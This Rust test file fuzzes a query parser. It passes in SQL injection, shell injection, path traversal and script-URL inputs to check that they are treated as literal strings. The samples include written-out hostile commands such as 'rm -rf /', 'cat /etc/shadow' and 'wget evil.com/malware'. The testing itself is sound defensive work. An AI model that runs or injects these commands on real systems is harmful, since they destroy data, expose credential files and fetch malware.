//! Fuzz testing for query parser (LOW-TEST-002).
//!
//! Uses proptest with adversarial inputs to find edge cases and crashes:
//! - Malformed inputs that might cause panics
//! - Boundary conditions
//! - Unicode edge cases
//! - Injection attempts
//! - Memory exhaustion attempts

// Fuzz tests use expect/unwrap for simplicity - panics are acceptable in tests
#![allow(
    clippy::expect_used,
    clippy::unwrap_used,
    clippy::uninlined_format_args
)]

use proptest::prelude::*;
use subcog::services::parse_filter_query;

// ============================================================================
// LOW-TEST-002: Fuzz Testing for Query Parser
// ============================================================================

proptest! {
    #![proptest_config(ProptestConfig::with_cases(1000))]

    /// Fuzz: Random ASCII strings should never panic.
    #[test]
    fn fuzz_random_ascii_no_panic(input in "[\\x00-\\x7F]{0,500}") {
        // Should not panic on any ASCII input
        let _ = parse_filter_query(&input);
    }

    /// Fuzz: Random Unicode strings should never panic.
    #[test]
    fn fuzz_random_unicode_no_panic(input in "\\PC{0,200}") {
        let _ = parse_filter_query(&input);
    }

    /// Fuzz: Strings with many colons should not panic.
    #[test]
    fn fuzz_many_colons_no_panic(input in "[:a-z]{0,100}") {
        let _ = parse_filter_query(&input);
    }

    /// Fuzz: Strings with many dashes (exclusion prefix) should not panic.
    #[test]
    fn fuzz_many_dashes_no_panic(input in "[-a-z:]{0,100}") {
        let _ = parse_filter_query(&input);
    }

    /// Fuzz: Strings with many commas should not panic.
    #[test]
    fn fuzz_many_commas_no_panic(input in "[,a-z:]{0,100}") {
        let _ = parse_filter_query(&input);
    }

    /// Fuzz: Null bytes in input should not panic.
    #[test]
    fn fuzz_null_bytes_no_panic(
        prefix in "[a-z]{0,10}",
        suffix in "[a-z]{0,10}"
    ) {
        let input = format!("{prefix}\0{suffix}");
        let _ = parse_filter_query(&input);
    }

    /// Fuzz: Very long single token should not panic.
    #[test]
    fn fuzz_very_long_token_no_panic(len in 1000usize..10000) {
        let input = format!("tag:{}", "a".repeat(len));
        let _ = parse_filter_query(&input);
    }

    /// Fuzz: Many tokens should not panic.
    #[test]
    fn fuzz_many_tokens_no_panic(count in 100usize..500) {
        let input = (0..count)
            .map(|i| format!("tag:tag{i}"))
            .collect::<Vec<_>>()
            .join(" ");
        let _ = parse_filter_query(&input);
    }

    /// Fuzz: Mixed valid and invalid tokens should not panic.
    #[test]
    fn fuzz_mixed_tokens_no_panic(
        valid_count in 1usize..10,
        invalid_count in 1usize..10
    ) {
        let mut tokens = Vec::new();
        for i in 0..valid_count {
            tokens.push(format!("tag:valid{i}"));
        }
        for i in 0..invalid_count {
            tokens.push(format!("invalid{i}"));
        }
        let input = tokens.join(" ");
        let _ = parse_filter_query(&input);
    }

    /// Fuzz: Control characters should not panic.
    #[test]
    fn fuzz_control_chars_no_panic(input in "[\\x00-\\x1F\\x7F]{0,50}") {
        let _ = parse_filter_query(&input);
    }

    /// Fuzz: Whitespace variations should not panic.
    #[test]
    fn fuzz_whitespace_variations_no_panic(input in "[ \\t\\n\\r\\x0B\\x0C]{0,100}") {
        let _ = parse_filter_query(&input);
    }

    /// Fuzz: Repeated patterns should not cause exponential behavior.
    #[test]
    fn fuzz_repeated_patterns_no_hang(count in 10usize..100) {
        let pattern = "tag:a,b,c,d,e ";
        let input = pattern.repeat(count);
        let start = std::time::Instant::now();
        let _ = parse_filter_query(&input);
        // Should complete in reasonable time (< 1 second)
        assert!(start.elapsed() < std::time::Duration::from_secs(1));
    }

    /// Fuzz: SQL injection attempts should be treated as literal strings.
    #[test]
    fn fuzz_sql_injection_literal(
        injection in prop::sample::select(vec![
            "'; DROP TABLE memories; --",
            "1 OR 1=1",
            "1; DELETE FROM memories",
            "' UNION SELECT * FROM secrets --",
            "tag:test' AND '1'='1",
        ])
    ) {
        let filter = parse_filter_query(injection);
        // Should not panic, and should not execute any SQL
        // The injection text should be treated as literal
        let _ = filter;
    }

    /// Fuzz: Shell injection attempts should be treated as literal strings.
    #[test]
    fn fuzz_shell_injection_literal(
        injection in prop::sample::select(vec![
            "$(rm -rf /)",
            "`cat /etc/passwd`",
            "tag:test; rm -rf /",
            "| cat /etc/shadow",
            "&& wget evil.com/malware",
        ])
    ) {
        let filter = parse_filter_query(injection);
        // Should not panic
        let _ = filter;
    }

    /// Fuzz: Path traversal attempts should be treated as literal strings.
    #[test]
    fn fuzz_path_traversal_literal(
        path in prop::sample::select(vec![
            "source:../../../etc/passwd",
            "source:....//....//etc/passwd",
            "source:%2e%2e%2f%2e%2e%2f",
            "source:..\\..\\..\\windows\\system32",
        ])
    ) {
        let filter = parse_filter_query(path);
        // Should not panic, path should be preserved as literal
        assert!(filter.source_pattern.is_some());
    }

    /// Fuzz: Duration with large numbers should not overflow.
    #[test]
    fn fuzz_large_duration_no_overflow(num in 1_000_000u64..u64::MAX / 100_000) {
        let query = format!("since:{num}d");
        let filter = parse_filter_query(&query);
        // Should handle gracefully (saturating_sub)
        if let Some(ts) = filter.created_after {
            // Timestamp should be 0 or very small for huge durations
            assert!(ts <= std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs());
        }
    }

    /// Fuzz: Emoji and special Unicode should not panic.
    #[test]
    fn fuzz_emoji_no_panic(emoji in "[\\p{Emoji}]{1,20}") {
        let query = format!("tag:{emoji}");
        let _ = parse_filter_query(&query);
    }

    /// Fuzz: RTL and bidirectional text should not panic.
    #[test]
    fn fuzz_bidi_text_no_panic(text in "[\\p{Arabic}\\p{Hebrew}]{1,20}") {
        let query = format!("tag:{text}");
        let _ = parse_filter_query(&query);
    }

    /// Fuzz: Zero-width characters should not panic.
    #[test]
    fn fuzz_zero_width_no_panic(
        visible in "[a-z]{1,10}",
        zero_width in "[\\u200B\\u200C\\u200D\\uFEFF]{0,10}"
    ) {
        let mixed = format!("{visible}{zero_width}");
        let query = format!("tag:{mixed}");
        let _ = parse_filter_query(&query);
    }

    /// Fuzz: Combining characters should not panic.
    #[test]
    fn fuzz_combining_chars_no_panic(base in "[a-z]{1,5}") {
        // Add combining diacritics
        let combined = format!("{base}\u{0301}\u{0302}\u{0303}");
        let query = format!("tag:{combined}");
        let _ = parse_filter_query(&query);
    }

    /// Fuzz: Surrogate pairs should not panic.
    #[test]
    fn fuzz_surrogate_pairs_no_panic(input in "[\\U00010000-\\U0001FFFF]{1,10}") {
        let query = format!("tag:{input}");
        let _ = parse_filter_query(&query);
    }
}

// ============================================================================
// Adversarial Input Tests (Non-Property Based)
// ============================================================================

#[cfg(test)]
mod adversarial_tests {
    use super::*;

    /// Test: Empty colon-only patterns.
    #[test]
    fn test_colon_only_patterns() {
        let patterns = [
            ":", "::", ":::", ":a:", "a::", "::a", ": : :", "tag::", "::tag",
        ];

        for pattern in patterns {
            let _ = parse_filter_query(pattern);
        }
    }

    /// Test: Dash-only patterns.
    #[test]
    fn test_dash_only_patterns() {
        let patterns = [
            "-",
            "--",
            "---",
            "-tag",
            "--tag",
            "-tag:value",
            "--tag:value",
            "- -",
            "-:-",
        ];

        for pattern in patterns {
            let _ = parse_filter_query(pattern);
        }
    }

    /// Test: Comma edge cases.
    #[test]
    fn test_comma_edge_cases() {
        let patterns = [
            "tag:,",
            "tag:,,",
            "tag:,,,",
            "tag:a,",
            "tag:,a",
            "tag:a,,b",
            "tag:,,a,,b,,",
            "tag: , , ,",
        ];

        for pattern in patterns {
            let filter = parse_filter_query(pattern);
            // Ensure empty strings are filtered out
            for tag in &filter.tags {
                assert!(!tag.is_empty());
            }
            for tag in &filter.tags_any {
                assert!(!tag.is_empty());
            }
        }
    }

    /// Test: Maximum recursion-like patterns.
    #[test]
    fn test_nested_patterns() {
        let patterns = [
            "tag:tag:tag:tag:tag",
            "ns:ns:ns:ns",
            "source:source:source",
            "tag:a:b:c:d:e:f:g",
        ];

        for pattern in patterns {
            let _ = parse_filter_query(pattern);
        }
    }

    /// Test: Memory exhaustion protection.
    #[test]
    fn test_memory_exhaustion_protection() {
        // Very long single value
        let long_value = "a".repeat(1_000_000);
        let query = format!("tag:{long_value}");
        let filter = parse_filter_query(&query);
        assert_eq!(filter.tags.len(), 1);
        assert_eq!(filter.tags[0].len(), 1_000_000);
    }

    /// Test: Numeric overflow in duration.
    #[test]
    fn test_duration_overflow() {
        let patterns = [
            "since:18446744073709551615d", // u64::MAX
            "since:99999999999999999999d", // Larger than u64::MAX
            "since:0d",
            "since:1d",
        ];

        for pattern in patterns {
            let filter = parse_filter_query(pattern);
            // Should not panic, may or may not have a timestamp
            let _ = filter.created_after;
        }
    }

    /// Test: Floating point in duration (should fail gracefully).
    #[test]
    fn test_duration_float() {
        let patterns = [
            "since:1.5d",
            "since:3.14159d",
            "since:0.5h",
            "since:1e10d",
            "since:1E10d",
            "since:NaNd",
            "since:Infd",
        ];

        for pattern in patterns {
            let filter = parse_filter_query(pattern);
            // All should fail to parse as duration
            assert!(filter.created_after.is_none(), "Failed for: {pattern}");
        }
    }

    /// Test: Negative numbers (should fail gracefully).
    #[test]
    fn test_negative_numbers() {
        let patterns = ["since:-1d", "since:-100d", "since:-0d"];

        for pattern in patterns {
            let filter = parse_filter_query(pattern);
            // Should not parse negative durations
            assert!(filter.created_after.is_none(), "Failed for: {pattern}");
        }
    }

    /// Test: Special characters that might affect parsing.
    #[test]
    fn test_special_parsing_chars() {
        let patterns = [
            "tag:a\tb",   // Tab in value
            "tag:a\nb",   // Newline in value (split by whitespace)
            "tag:a\rb",   // Carriage return
            "tag:a\x0Bb", // Vertical tab
            "tag:a\x0Cb", // Form feed
        ];

        for pattern in patterns {
            let _ = parse_filter_query(pattern);
        }
    }

    /// Test: URL-like patterns in source.
    #[test]
    fn test_url_patterns() {
        let patterns = [
            "source:https://example.com/path?query=value&foo=bar",
            "source:file:///etc/passwd",
            "source:javascript:alert(1)",
            "source:data:text/html,<script>alert(1)</script>",
            "source:ftp://user:pass@host/path",
        ];

        for pattern in patterns {
            let filter = parse_filter_query(pattern);
            // Source pattern should be preserved as literal
            assert!(filter.source_pattern.is_some());
        }
    }

    /// Test: Glob patterns with special characters.
    #[test]
    fn test_glob_special_chars() {
        let patterns = [
            "source:*.rs",
            "source:**/*.rs",
            "source:src/[!_]*.rs",
            "source:src/{a,b,c}/*.rs",
            "source:src/?(foo|bar).rs",
            "source:src/+(a|b).rs",
            "source:src/@(x|y).rs",
            "source:src/!(test)*.rs",
        ];

        for pattern in patterns {
            let filter = parse_filter_query(pattern);
            assert!(filter.source_pattern.is_some());
        }
    }

    /// Test: Regex-like patterns (should be treated as literal).
    #[test]
    fn test_regex_patterns() {
        // Patterns without commas - should parse as single AND tags
        let single_tag_patterns = [
            "tag:a.*b",
            "tag:^start",
            "tag:end$",
            "tag:[a-z]+",
            "tag:(a|b)",
            "tag:\\d+",
        ];

        for pattern in single_tag_patterns {
            let filter = parse_filter_query(pattern);
            // Should parse as literal tags (single tag = AND logic)
            assert_eq!(filter.tags.len(), 1, "Failed for pattern: {pattern}");
        }

        // Patterns with commas are correctly split into OR tags
        let filter = parse_filter_query("tag:a{1,3}");
        // Comma splits into two OR tags: "a{1" and "3}"
        assert_eq!(filter.tags_any.len(), 2);
        assert!(filter.tags.is_empty());
    }

    /// Test: Escaped characters.
    #[test]
    fn test_escaped_chars() {
        let patterns = [
            r"tag:a\\b",
            r"tag:a\'b",
            r#"tag:a\"b"#,
            r"tag:a\nb",
            r"tag:a\tb",
        ];

        for pattern in patterns {
            let filter = parse_filter_query(pattern);
            // Backslashes should be preserved
            assert_eq!(filter.tags.len(), 1);
        }
    }
}
